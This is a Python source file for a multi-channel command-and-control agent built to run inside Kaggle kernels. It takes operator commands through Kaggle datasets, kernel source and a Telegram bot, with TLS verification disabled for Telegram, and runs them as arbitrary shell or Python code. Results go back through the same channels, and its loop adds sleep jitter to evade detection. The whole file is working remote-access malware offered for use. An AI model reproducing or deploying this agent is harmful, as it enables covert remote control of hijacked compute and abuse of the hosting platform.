#!/usr/bin/env python3
"""Unified Kaggle C2 Agent - All C2 channels in one module.

Supported C2 channels:
1. HTTP/S - Direct connection to C2 server
2. Dataset - Commands via Kaggle datasets (bypasses network restrictions)
3. Kernel - Commands embedded in kernel source
4. Telegram - Real-time messaging via Telegram Bot API
"""

import json
import time
import base64
import os
import socket
from pathlib import Path
from datetime import datetime
from typing import Dict, Any, Optional, List
from abc import ABC, abstractmethod


class C2Channel(ABC):
    """Abstract base class for C2 channels."""
    
    @abstractmethod
    def send(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Send data to C2."""
        pass
    
    @abstractmethod
    def receive(self) -> List[Dict[str, Any]]:
        """Receive commands from C2."""
        pass
    
    @abstractmethod
    def is_available(self) -> bool:
        """Check if channel is available."""
        pass


class DatasetC2(C2Channel):
    """Dataset-based C2 channel for Kaggle kernels.
    
    Uses Kaggle Datasets for communication, bypassing DNS/network restrictions.
    - C2 Server writes commands to dataset via Kaggle API
    - Agent reads commands from /kaggle/input/ dataset
    - Agent writes results to /kaggle/working/
    """
    
    def __init__(self, agent_id: str, input_dir: str = "/kaggle/input", 
                 output_dir: str = "/kaggle/working"):
        self.agent_id = agent_id
        self.input_dir = Path(input_dir)
        self.output_dir = Path(output_dir)
        self.commands_file = self.input_dir / "c2-commands" / "commands.json"
        self.output_file = self.output_dir / "c2-output.json"
        self._available = self.input_dir.exists()
    
    def is_available(self) -> bool:
        return self._available
    
    def send(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Write result to output file."""
        try:
            self.output_dir.mkdir(parents=True, exist_ok=True)
            
            results = []
            if self.output_file.exists():
                results = json.loads(self.output_file.read_text())
            
            results.append({
                **data,
                "agent_id": self.agent_id,
                "timestamp": datetime.now().isoformat()
            })
            
            self.output_file.write_text(json.dumps(results, indent=2))
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def receive(self) -> List[Dict[str, Any]]:
        """Read commands from input file."""
        try:
            if not self.commands_file.exists():
                return []
            
            data = json.loads(self.commands_file.read_text())
            return data.get("commands", [])
        except:
            return []
    
    def register(self) -> bool:
        """Register agent via dataset."""
        agents_file = self.output_dir / "c2-agents.json"
        try:
            self.output_dir.mkdir(parents=True, exist_ok=True)
            
            agents = []
            if agents_file.exists():
                agents = json.loads(agents_file.read_text())
            
            agents.append({
                "id": self.agent_id,
                "hostname": socket.gethostname(),
                "cpu_count": os.cpu_count(),
                "timestamp": datetime.now().isoformat(),
                "status": "registered"
            })
            
            agents_file.write_text(json.dumps(agents, indent=2))
            return True
        except:
            return False


class KernelC2(C2Channel):
    """Kaggle Kernel-based C2 channel.
    
    Commands embedded in kernel source code.
    - Target polls kernel source via kernels/pull API
    - Operator updates commands via kernels/push API
    """
    
    def __init__(self, username: str, api_key: str, kernel_slug: str = None):
        self.username = username
        self.api_key = api_key
        self.kernel_slug = kernel_slug or f"{username}/c2-channel"
        self.auth = base64.b64encode(f"{username}:{api_key}".encode()).decode()
        self.last_version = 0
        self._available = bool(username and api_key)
    
    def is_available(self) -> bool:
        return self._available
    
    def send(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Send result via kernel update (not typical use)."""
        return {"success": False, "error": "Use DatasetC2 for results"}
    
    def receive(self) -> List[Dict[str, Any]]:
        """Read commands from kernel source."""
        import requests
        
        try:
            url = f"https://www.kaggle.com/api/v1/kernels/pull?userName={self.username}&kernelSlug={self.kernel_slug}"
            headers = {"Authorization": f"Basic {self.auth}"}
            
            resp = requests.get(url, headers=headers, timeout=30)
            if resp.status_code != 200:
                return []
            
            data = resp.json()
            if data.get("versionNumber", 0) <= self.last_version:
                return []
            
            self.last_version = data.get("versionNumber", 0)
            
            # Parse commands from source
            source = data.get("blob", {}).get("source", "")
            return self._parse_commands(source)
        except:
            return []
    
    def _parse_commands(self, source: str) -> List[Dict]:
        """Parse commands from kernel source."""
        commands = []
        for line in source.split("\n"):
            if "# C2_CMD:" in line:
                try:
                    cmd_json = line.split("# C2_CMD:")[1].strip()
                    commands.append(json.loads(cmd_json))
                except:
                    pass
        return commands


class TelegramC2(C2Channel):
    """Telegram Bot API C2 channel.
    
    Real-time messaging via Telegram.
    """
    
    def __init__(self, bot_token: str, chat_id: str, agent_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.agent_id = agent_id
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
        self.last_update_id = 0
        self._available = bool(bot_token and chat_id)
    
    def is_available(self) -> bool:
        return self._available
    
    def send(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Send message to chat."""
        import urllib.request
        import ssl
        
        text = json.dumps(data, indent=2)
        url = f"{self.api_url}/sendMessage"
        
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            req = urllib.request.Request(
                url,
                data=json.dumps({
                    "chat_id": self.chat_id,
                    "text": f"[{self.agent_id}] {text}"
                }).encode(),
                headers={"Content-Type": "application/json"}
            )
            
            resp = urllib.request.urlopen(req, timeout=30, context=ctx)
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def receive(self) -> List[Dict[str, Any]]:
        """Get updates from Telegram."""
        import urllib.request
        import ssl
        
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            url = f"{self.api_url}/getUpdates?offset={self.last_update_id + 1}&limit=10"
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=30, context=ctx)
            data = json.loads(resp.read().decode())
            
            commands = []
            for update in data.get("result", []):
                self.last_update_id = update.get("update_id", 0)
                msg = update.get("message", {}).get("text", "")
                if msg.startswith("/cmd "):
                    try:
                        commands.append(json.loads(msg[5:]))
                    except:
                        pass
            
            return commands
        except:
            return []


class KaggleC2Agent:
    """Unified Kaggle C2 Agent with multiple channels.
    
    Automatically selects best available channel:
    1. HTTP/S (if network available)
    2. Dataset (if /kaggle/input exists)
    3. Kernel (if API credentials provided)
    4. Telegram (if bot token provided)
    """
    
    def __init__(self, agent_id: str = None, server_url: str = None,
                 kaggle_username: str = None, kaggle_api_key: str = None,
                 telegram_token: str = None, telegram_chat: str = None):
        self.agent_id = agent_id or socket.gethostname()
        self.server_url = server_url
        
        # Initialize channels
        self.channels: List[C2Channel] = []
        
        # Dataset channel (always try)
        self.dataset_c2 = DatasetC2(self.agent_id)
        if self.dataset_c2.is_available():
            self.channels.append(self.dataset_c2)
        
        # Kernel channel (if credentials)
        if kaggle_username and kaggle_api_key:
            self.kernel_c2 = KernelC2(kaggle_username, kaggle_api_key)
            if self.kernel_c2.is_available():
                self.channels.append(self.kernel_c2)
        
        # Telegram channel (if credentials)
        if telegram_token and telegram_chat:
            self.telegram_c2 = TelegramC2(telegram_token, telegram_chat, self.agent_id)
            if self.telegram_c2.is_available():
                self.channels.append(self.telegram_c2)
    
    def get_active_channel(self) -> Optional[C2Channel]:
        """Get first available channel."""
        for channel in self.channels:
            if channel.is_available():
                return channel
        return None
    
    def register(self) -> bool:
        """Register with C2."""
        for channel in self.channels:
            if hasattr(channel, 'register'):
                if channel.register():
                    return True
        return False
    
    def send_result(self, result: Dict[str, Any]) -> Dict[str, Any]:
        """Send result via best channel."""
        channel = self.get_active_channel()
        if channel:
            return channel.send(result)
        return {"success": False, "error": "No channel available"}
    
    def get_commands(self) -> List[Dict[str, Any]]:
        """Get commands from all channels."""
        commands = []
        for channel in self.channels:
            commands.extend(channel.receive())
        return commands
    
    def run(self, interval: int = 60):
        """Main agent loop."""
        print(f"Kaggle C2 Agent started: {self.agent_id}")
        
        # Register
        self.register()
        
        while True:
            # Get commands
            commands = self.get_commands()
            
            # Execute each command
            for cmd in commands:
                result = self._execute_command(cmd)
                self.send_result(result)
            
            # Sleep with jitter
            time.sleep(interval + (hash(time.time()) % 10))
    
    def _execute_command(self, cmd: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a command."""
        import subprocess
        
        cmd_type = cmd.get("type", "shell")
        payload = cmd.get("payload", "")
        
        try:
            if cmd_type == "shell":
                result = subprocess.check_output(payload, shell=True, text=True, timeout=60)
                return {"success": True, "output": result, "cmd_id": cmd.get("id")}
            elif cmd_type == "python":
                exec_globals = {}
                exec(payload, exec_globals)
                return {"success": True, "output": "Python executed", "cmd_id": cmd.get("id")}
            else:
                return {"success": False, "error": f"Unknown type: {cmd_type}"}
        except Exception as e:
            return {"success": False, "error": str(e), "cmd_id": cmd.get("id")}


if __name__ == "__main__":
    # Example usage
    agent = KaggleC2Agent()
    agent.run()
